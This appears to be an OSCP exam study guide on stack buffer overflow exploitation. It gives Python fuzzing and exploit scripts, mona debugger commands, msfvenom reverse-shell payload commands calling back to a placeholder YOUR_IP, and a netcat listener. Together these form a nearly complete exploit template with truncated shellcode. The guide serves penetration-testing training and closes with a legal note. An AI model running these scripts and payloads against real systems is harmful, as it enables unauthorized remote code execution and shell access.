# Buffer Overflow Exploitation

Buffer overflows are a critical vulnerability class that can lead to remote code execution. This guide covers the fundamentals of buffer overflow exploitation, which is essential for the OSCP exam.

## üìã Table of Contents
1. [Buffer Overflow Basics](#buffer-overflow-basics)
2. [Fuzzing](#fuzzing)
3. [Finding the Offset](#finding-the-offset)
4. [Controlling EIP](#controlling-eip)
5. [Finding Bad Characters](#finding-bad-characters)
6. [Finding the Right Module](#finding-the-right-module)
7. [Generating Shellcode](#generating-shellcode)
8. [Gaining a Shell](#gaining-a-shell)
9. [Tools](#-tools)
10. [Practice](#-practice)

## Buffer Overflow Basics

### What is a Buffer Overflow?
A buffer overflow occurs when a program writes more data to a buffer than it can hold, potentially overwriting adjacent memory and altering the program's execution flow.

### Key Concepts
- **Stack**: Memory region that stores function calls and local variables
- **EIP**: Extended Instruction Pointer - points to the next instruction to execute
- **ESP**: Extended Stack Pointer - points to the top of the stack
- **JMP ESP**: Assembly instruction that jumps to the address in ESP

## Fuzzing

### Basic Fuzzing Script
```python
#!/usr/bin/python3
import socket, sys

buffer = "A" * 100

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('TARGET_IP', PORT))
        s.send((buffer))
        s.close()
        buffer += "A" * 100
    except:
        print(f"Fuzzing crashed at {len(buffer)} bytes")
        sys.exit()
```

## Finding the Offset

### Pattern Create/Offset
```bash
# Generate pattern
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000

# Find offset after crash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [EIP_VALUE]
```

### Verify EIP Control
```python
offset = 1978
buffer = "A" * offset + "BBBB" + "C" * 500
```

## Controlling EIP

### Finding JMP ESP
1. Use `!mona modules` to find unprotected modules
2. Look for modules with no memory protections (ASLR, DEP, etc.)
3. Find JMP ESP instruction: `!mona find -s "\xff\xe4" -m module.dll`

### Example
```python
# Little-endian format
jmp_esp = "\xaf\x11\x50\x62"  # 0x625011af
buffer = "A" * 1978 + jmp_esp + "\x90" * 16
```

## Finding Bad Characters

### Bad Character Generator
```python
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
           "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
           "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
           "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
           "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
           "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
           "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
           "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
           "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
           "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
           "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
           "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
           "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
           "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
           "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
           "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

buffer = "A" * 1978 + "BBBB" + badchars
```

### Mona Configuration
```
!mona config -set workingfolder c:\mona\%p
!mona bytearray -b "\x00"
!mona compare -f C:\mona\bytearray.bin -a [ESP_ADDRESS]
```

## Finding the Right Module

### Mona Commands
```
# List modules
!mona modules

# Find JMP ESP
!mona find -s "\xff\xe4" -m essfunc.dll

# Check for memory protections
!mona jmp -r esp -cpb "\x00"
```

## Generating Shellcode

### MSFvenom
```bash
# Windows reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00" -f c

# Linux reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 -b "\x00" -f c
```

### Final Exploit Structure
```python
# Buffer overflow exploit template
import socket

# Target information
RHOST = "TARGET_IP"
RPORT = 9999

# Bad characters: \x00\x0a\x0d
# JMP ESP: 0x625011AF
# Shellcode: msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d" -f c

shellcode = ("\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" + 
             "..." )  # Truncated for brevity

# Build the buffer
offset = 1978
buffer = ""
buffer += "A" * offset
buffer += "\xaf\x11\x50\x62"  # JMP ESP address in little endian
buffer += "\x90" * 32          # NOP sled
buffer += shellcode

# Send the exploit
try:
    print("[*] Sending exploit...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((RHOST, RPORT))
    s.send((buffer + "\r\n"))
    s.close()
    print("[*] Exploit sent successfully!")
except:
    print("[!] Could not connect to the server.")
```

## Gaining a Shell

### Netcat Listener
```bash
nc -nvlp 4444
```

### Common Issues
- **Crash with no shell**: Check for bad characters, ESP alignment
- **Shell dies immediately**: Use EXITFUNC=thread in msfvenom
- **No connection back**: Check firewall rules, IP/port forwarding

## üõ† Tools

### Debugging
- **Immunity Debugger**: Windows debugger with Mona plugin
- **x64dbg**: Alternative to Immunity
- **GDB**: Linux debugger
- **PEDA**: Python Exploit Development Assistance for GDB

### Pattern Creation
- `pattern_create.rb`: Generate unique patterns
- `pattern_offset.rb`: Find offset from pattern
- Mona: `!mona pattern_create`

### Shellcode Generation
- **msfvenom**: Generate various payloads
- **Shellcode Compiler**: Convert C to shellcode
- **Mona**: `!mona shellcode`

## üìö Resources
- [FuzzySecurity Buffer Overflow Guide](https://www.fuzzysecurity.com/tutorials/expDev/1.html)
- [Corelan Buffer Overflow Tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)
- [OSCP Buffer Overflow Cheat Sheet](https://github.com/frizb/OSCP-Buffer-Overflow-Cheatsheet)
- [Offensive Security Buffer Overflow Guide](https://www.offensive-security.com/metasploit-unleashed/buffer-overflow-vulnerabilities/)

## üéØ Practice
1. Set up a Windows VM with a vulnerable application
2. Practice each step of the buffer overflow process
3. Try different payloads and shellcode
4. Experiment with different memory protections

## ‚ö†Ô∏è Legal Note
Only practice buffer overflows on systems you own or have explicit permission to test. Unauthorized testing is illegal.
